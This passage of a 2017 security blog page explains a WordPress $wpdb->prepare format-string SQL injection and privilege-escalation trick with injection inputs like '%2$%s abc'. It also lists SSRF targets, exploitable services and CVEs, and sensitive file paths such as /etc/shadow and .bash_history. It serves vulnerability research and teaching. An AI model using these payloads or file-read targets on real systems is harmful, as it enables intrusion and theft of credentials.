unquoting</span></div><div class="line">	$query = preg_replace( <span class="string">'|(?&lt;!%)%f|'</span> , <span class="string">'%F'</span>, $query ); <span class="comment">// Force floats to be locale unaware</span></div><div class="line">	$query = preg_replace( <span class="string">'|(?&lt;!%)%s|'</span>, <span class="string">"'%s'"</span>, $query ); <span class="comment">// quote the strings, avoiding escaped strings like %%s</span></div><div class="line">	array_walk( $args, <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'escape_by_ref'</span> ) );</div><div class="line">	<span class="keyword">return</span> @vsprintf( $query, $args );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>该函数主要做了以下几件工作：</p>
+<p>1). 判断$args[0]是否数组，如果是则使$args=$args[0]。<br>2). 将$query中’%s’替换为%s。<br>3). 将$query中”%s”替换为%s。<br>4). 再将%s替换为’%s’。<br>5). 将$args用mysql_real_escape_string转义。<br>6). 返回vsprintf( $query, $args )。</p>
+<p>经分析，该函数可能导致两个问题：</p>
+<p>1). 逻辑漏洞</p>
+<p>若程序中存在类似下列的代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$query = $wpdb-&gt;prepare( <span class="string">'update articles set title = %s where id = %d and uid = %d'</span>, $_GET[<span class="string">'title'</span>], $_GET[<span class="string">'id'</span>], get_current_uid());</div></pre></td></tr></table></figure></p>
+<p>按正常的业务逻辑，prepare将返回<code>vsprintf(  &#39;update articles set title = %s where id = %d and uid = %d&#39;, array($_GET[&#39;title&#39;], $_GET[&#39;id&#39;], get_current_uid() )</code>的执行结果。<br>但是此时format后的第一个参数（$_GET[‘title’]）我们完全可控，如果我们使第一个参数为数组，我们就可以控制用户ID，如：$_GET[‘title’] = array(‘title’, ‘id’ ,’xxx’)，此时prepare将返回<code>vsprintf(  &#39;update articles set title = %s where id = %d and uid = %d&#39;, array(&#39;title&#39;, &#39;id&#39; ,&#39;xxx&#39;)</code>。<br>此时，一个越权漏洞就产生了。</p>
+<p>2). SQL注入</p>
+<p>若程序中存在类似下列的代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$append = $wpdb-&gt;prepare( <span class="string">'and tag = %s'</span>, $_GET[<span class="string">'tag'</span>]);</div><div class="line">$query = $wpdb-&gt;prepare( <span class="string">'select * from articles where uid = %d and cid = %d '</span>.$append, get_current_uid(), $_GET[<span class="string">'cid'</span>]);</div><div class="line">mysql_query($query);</div></pre></td></tr></table></figure></p>
+<p>我们使得<code>tag=%s</code>，则<code>$append=&quot;and tag = &#39;%sa&#39;&quot;</code>。此时的<code>$query</code>将为<code>$wpdb-&gt;prepare( &#39;select * from articles where uid = %d and cid = %d and tag = \&#39;%s\&#39;&#39;, get_current_uid(), $_GET[&#39;cid&#39;])</code>，经prepare处理后等同于<code>$query = vsprintf(&#39;select * from articles where uid = %d and cid = %d and tag = \&#39;\&#39;%s\&#39;a\&#39;&#39;, array(get_current_uid(), $_GET[&#39;cid&#39;]));</code>。<br>此时的%s将处于单引号之外，如果%s可控，将导致SQL注入。此时，就要用到前面1.3部分提到的<strong>Argument numbering/swapping</strong>，我们可以使<code>tag=%2$s</code>,但是此时不存在<code>%s</code>，经prepare函数处理后，<code>$query = vsprintf(&#39;select * from articles where uid = %d and cid = %d and tag = \&#39;%2$s\&#39;&#39;, array(get_current_uid(), $_GET[&#39;cid&#39;]));</code>，虽然此时的%2$s经vsprintf函数格式化后将等于<code>$_GET[&#39;cid&#39;]</code>的值，但是参数被包含在引号之内，无法导致SQL注入。</p>
+<p>这时我们就需要用到1.3内的<strong>字符串自动补位</strong>。我们使<code>tag=%2$%s abc</code>，经prepare处理后<code>$query = vsprintf(&#39;select * from articles where uid = %d and cid = %d and tag = \&#39;%2$\&#39;%s\&#39; abc\&#39;&#39;, array(get_current_uid(), $_GET[&#39;cid&#39;]));</code>。此时的关键部分为<code>tag = &#39;%2$&#39;%s&#39; abc&#39;</code>，此时的<code>%2$&#39;%s</code>为格式化标识，里面2代表第二个参数（即<code>$_GET[&#39;cid&#39;]</code>），’%表示用%填充，s表示格式化为字符串，默认的填充位数为0。</p>
+<p>范例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">"tag = '%1$'%s' abc'"</span>, <span class="string">'123'</span>);</div><div class="line"><span class="comment">//输出tag = '123' abc'</span></div><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">"tag = '%1$'%0s' abc'"</span>, <span class="string">'123'</span>);</div><div class="line"><span class="comment">//输出tag = '123' abc'</span></div><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">"tag = '%1$'%5s' abc'"</span>, <span class="string">'123'</span>);</div><div class="line"><span class="comment">//输出tag = '%%123' abc'</span></div></pre></td></tr></table></figure></p>
+<p>此时的abc将在单引号外，且用户可控，即产生了SQL注入漏洞。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li>Wordpress SQLi by slavco - <a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94" target="_blank" rel="external">https://medium.com/websec/wordpress-sqli-bbb2afcc8e94</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulspy.com/2017/09/02/Wordpress-SQL-Injection-Analysis-1/" data-id="cj9y5qhhe0004lqpvhfealazk" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-SSRF-And-URL-Related-TIPS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/12/SSRF-And-URL-Related-TIPS/" class="article-date">
+  <time datetime="2017-08-11T16:00:01.000Z" itemprop="datePublished">2017-08-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/12/SSRF-And-URL-Related-TIPS/">SSRF And URL Related TIPS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Author: Ambulong@vulspy</p>
+<h1 id="SSRF-Related-Tips"><a href="#SSRF-Related-Tips" class="headerlink" title="SSRF Related Tips"></a>SSRF Related Tips</h1><h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><ul>
+<li>Weblogic SSRF</li>
+<li>DokuWiki<ul>
+<li><a href="http://paper.seebug.org/230/" target="_blank" rel="external">DokuWiki fetch.php SSRF漏洞与tok安全验证绕过分析</a></li>
+</ul>
+</li>
+<li>Atlassian Confluence (CVE-2016-6595)<ul>
+<li><a href="http://xdxd.love/2016/06/03/confluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">Confluence任意文件读取漏洞以及CVE-2016-6596 SSRF漏洞分析</a></li>
+</ul>
+</li>
+<li>Discuz SSRF<ul>
+<li>Discuz + Memcache</li>
+<li>Discuz + Redis </li>
+</ul>
+</li>
+<li>vBulletin SSRF<ul>
+<li>vBulletin + Memcache</li>
+<li>vBulletin + Redis</li>
+</ul>
+</li>
+<li>Password Crack<ul>
+<li>FTP/FTPS</li>
+<li>IMAP/IMAPS/POP3/SMTP</li>
+<li>TELNET</li>
+<li>SSH</li>
+</ul>
+</li>
+</ul>
+<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><ul>
+<li>Redis</li>
+<li>Memcache</li>
+<li>Mongodb</li>
+<li>PHP-CGI/FastCGI</li>
+<li>Struts 2</li>
+<li>Counchdb WEB API</li>
+<li>Atlassian Confluence<ul>
+<li><a href="https://www.exploit-db.com/exploits/39170/" target="_blank" rel="external">Atlassian Confluence 5.2/5.8.14/5.8.15 - Multiple Vulnerabilities</a></li>
+<li><a href="http://xdxd.love/2016/06/03/confluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">Confluence任意文件读取漏洞以及CVE-2016-6596 SSRF漏洞分析</a></li>
+</ul>
+</li>
+<li>Axis2</li>
+<li>Glassfish</li>
+<li>JBOSS</li>
+<li>Docker Remote API</li>
+<li>Java RMI</li>
+<li>Elasticsearch Groovy</li>
+<li>WebDav PUT</li>
+<li>WebSphere</li>
+<li>Apache Hadoop</li>
+<li>HFS</li>
+<li>zentoPMS</li>
+</ul>
+<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><ul>
+<li><a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="external">bcoles/ssrf_proxy</a></li>
+</ul>
+<h2 id="Posts-amp-Reference"><a href="#Posts-amp-Reference" class="headerlink" title="Posts &amp; Reference"></a>Posts &amp; Reference</h2><ul>
+<li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">利用 Gopher 协议拓展攻击面 - 长亭科技</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="external">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - Orange</a></li>
+<li><a href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html" target="_blank" rel="external">How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange</a></li>
+<li><a href="https://www.acunetix.com/blog/articles/ssrf-vulnerability-used-to-scan-the-web-servers-network/" target="_blank" rel="external">Port scanning with Server Side Request Forgery (SSRF) - IAN MUSCAT</a></li>
+<li><a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="external">Build Your SSRF Exploit Framework - ring04h</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulspy.com/2017/08/12/SSRF-And-URL-Related-TIPS/" data-id="cj9y5qhhg0006lqpvejguco0z" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Local-Privilege-Escalation-Tips" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/02/Local-Privilege-Escalation-Tips/" class="article-date">
+  <time datetime="2017-08-01T16:00:00.000Z" itemprop="datePublished">2017-08-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/02/Local-Privilege-Escalation-Tips/">Local Privilege Escalation Tips</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Author: Ambulong@vulspy</p>
+<h1 id="PHP-SESSION"><a href="#PHP-SESSION" class="headerlink" title="PHP SESSION"></a>PHP SESSION</h1><ul>
+<li>phpMyAdmin</li>
+<li>ownCloud</li>
+</ul>
+<h1 id="PHP-Disable-Functions-Bypass"><a href="#PHP-Disable-Functions-Bypass" class="headerlink" title="PHP Disable Functions Bypass"></a>PHP Disable Functions Bypass</h1><ul>
+<li>Shellshock(CVE-2014-6271)</li>
+<li>Imagemagick</li>
+<li>Ghostscript</li>
+<li>FFmpeg</li>
+</ul>
+<h1 id="Port"><a href="#Port" class="headerlink" title="Port"></a>Port</h1><ul>
+<li>1099 - Java RMI (Java Deserialization RCE)</li>
+<li>2375 - Docker Remote API</li>
+<li>6379 - Redis</li>
+<li>8161 - ActiveMQ (CVE-2016-3088)</li>
+<li>9000 - PHP-CGI/FastCGI RCE</li>
+<li>9001 - Supervisord (CVE-2017-11610)</li>
+<li>9200 - Elasticsearch</li>
+<li>11211 - Memcached</li>
+<li>27017 - MongoDB</li>
+<li>27018 - MongoDB</li>
+<li>27019 - MongoDB</li>
+</ul>
+<h1 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h1><ul>
+<li><p>Shellshock (CVE-2014-6271)</p>
+<ul>
+<li>CGI-based web server</li>
+<li>DHCP</li>
+<li>Git/Subversion</li>
+<li>Qmail</li>
+<li>OpenSSH</li>
+</ul>
+</li>
+<li><p>Cisco Prime Infrastructure (CVE-2016-1291)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
+</li>
+<li><p>IBM WebSphere (CVE-2015-7450)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
+</li>
+<li><p>OpenNMS Java Object Deserialization RCE<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
+</li>
+<li><p>Jenkins CLI (CVE-2015-8103)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
+</li>
+<li><p>Jenkins Groovy XML RCE (CVE-2016-0792)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
+</li>
+<li><p>Oracle WebLogic Server (CVE-2016-3510)<br><a href="https://github.com/CoalfireLabs/java_deserialization_exploits" target="_blank" rel="external">CoalfireLabs/java_deserialization_exploits</a></p>
+</li>
+<li><p>Jenkins Unauthenticated Code Execution (CVE-2017-1000353)<br><a href="https://blogs.securiteam.com/index.php/archives/3171" target="_blank" rel="external">SSD Advisory – CloudBees Jenkins Unauthenticated Code Execution</a></p>
+</li>
+<li><p>JBOSS</p>
+</li>
+<li><p>Struts 2 RCE</p>
+<ul>
+<li>S2-001</li>
+<li>S2-003 </li>
+<li>S2-005 (CVE-2010-1870)</li>
+<li>S2-007</li>
+<li>S2-008</li>
+<li>S2-009 (CVE-2011-3923)</li>
+<li>S2-012 (CVE-2013-1965)</li>
+<li>S2-013 (CVE-2013-1966)</li>
+<li>S2-015 (CVE-2013-2135, CVE-2013-2134)</li>
+<li>S2-016 (CVE-2013-2251)</li>
+<li>S2-019 (CVE-2013-4316)</li>
+<li>S2-020 (CVE-2014-0094)</li>
+<li>S2-021 (CVE-2014-0112, CVE-2014-0113)</li>
+<li>S2-022 (CVE-2014-0116)</li>
+<li>S2-029 (CVE-2016-0785)</li>
+<li>S2-032 (CVE-2016-3081)</li>
+<li>S2-033 (CVE-2016-3087)</li>
+<li>S2-036 (CVE-2016-4461)</li>
+<li>S2-037 (CVE-2016-4438)</li>
+<li>S2-045 (CVE-2017-5638)</li>
+<li>S2-046 (CVE-2017-5638)</li>
+<li>S2-048 (CVE-2017-9791)</li>
+<li>S2-devMode</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>Apache Tomcat</li>
+</ul>
+<h1 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h1><ul>
+<li>PHP SESSION SAVE PATH<ul>
+<li>/tmp</li>
+<li>/var/lib/php/</li>
+<li>/var/lib/php5/</li>
+<li>/var/lib/php/sessions/</li>
+<li>/var/lib/php5/sessions/</li>
+</ul>
+</li>
+<li>NGINX CONFIG<ul>
+<li>/usr/local/nginx/conf/nginx.conf </li>
+<li>/usr/local/nginx/nginx.conf</li>
+<li>/etc/nginx/nginx.conf</li>
+</ul>
+</li>
+<li>APACHE CONFIG<ul>
+<li>/etc/httpd/conf/httpd.conf</li>
+<li>/usr/local/apache/conf/httpd.conf</li>
+<li>/usr/local/apache2/conf/httpd.conf</li>
+<li>/etc/httpd/conf.d</li>
+<li>/etc/apache2/conf/httpd.conf</li>
+<li>/etc/apache2/httpd.conf</li>
+<li>/etc/apache2/sites-available/000-default.conf</li>
+<li>/etc/apache2/sites-enabled/000-default.conf</li>
+<li>/apps/apache/conf/httpd.conf</li>
+<li>/apps/apache2/conf/httpd.conf</li>
+<li>/etc/httpd/conf.d/vhosts.conf</li>
+</ul>
+</li>
+<li>PHP INI<ul>
+<li>/etc/php.ini</li>
+<li>/etc/php/7.0/cli/php.ini</li>
+<li>/etc/php/7.0/fpm/php.ini</li>
+<li>/etc/php5/apache2/php.ini</li>
+<li>/etc/php5/cli/php.ini</li>
+<li>/usr/local/php/etc/php.ini</li>
+<li>/usr/local/Zend/etc/php.ini</li>
+<li>/usr/local/php/lib/php.ini</li>
+</ul>
+</li>
+<li>OTHER<ul>
+<li>/etc/passwd</li>
+<li>/etc/shadow</li>
+<li>/etc/group</li>
+<li>/etc/gshadow</li>
+<li>/etc/rc.local</li>
+<li>/etc/issue</li>
+<li>/etc/issue.net</li>
+<li>/proc/version</li>
+<li>/proc/self/environ</li>
+<li>/etc/sysconfig/network-scripts/ifcfg-eth0</li>
+<li>/etc/init.d/httpd</li>
+<li>/etc/init.d/mysqld</li>
+<li>/etc/syslog.conf</li>
+<li>/var/log/yum.log</li>
+<li>/etc/sysconfig/iptables-config</li>
+<li>/var/log/cron</li>
+<li>.bash_history</li>
+<li>.mysql_history</li>
+<li>.viminfo</li>
+<li>/etc/vsftpd/vsftpd.conf</li>
+<li>/etc/logrotate.d/vsftpd.log</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.vulspy.com/2017/08/02/Local-Privilege-Escalation-Tips/" data-id="cj9y5qhgt0000lqpv795wc2ek" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/">Wordpress &lt;= 4.8.2 SQL Injection POC</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/05/Wordpress-POST-META-Check-Bypass/">Wordpress POST META_NAME校验绕过</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/">Wordpress SQL注入分析（二）</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/02/Wordpress-SQL-Injection-Analysis-1/">Wordpress SQL注入分析（一）</a>
+          </li>
+        
+          <li>
+            <a href="/2017/08/12/SSRF-And-URL-Related-TIPS/">SSRF And URL Related TIPS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 <a href="mailto:zeng.ambulong@gmail.com">Ambulong</a><br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Vulspy Blog</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
